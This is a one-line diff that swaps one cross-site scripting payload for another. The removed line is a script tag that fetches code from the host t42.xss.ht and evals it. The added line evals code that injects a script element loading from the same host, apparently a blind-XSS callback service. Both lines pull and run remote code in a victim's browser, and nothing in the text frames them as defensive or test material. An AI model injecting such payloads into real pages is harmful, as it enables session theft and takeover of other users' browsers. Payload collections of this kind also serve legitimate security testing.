@@ -1,1 +1,1 @@
-<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//t42.xss.ht");a.send();</script>
+eval('var a=document.createElement(\'script\');a.src=\'https://t42.xss.ht\';document.body.appendChild(a)')
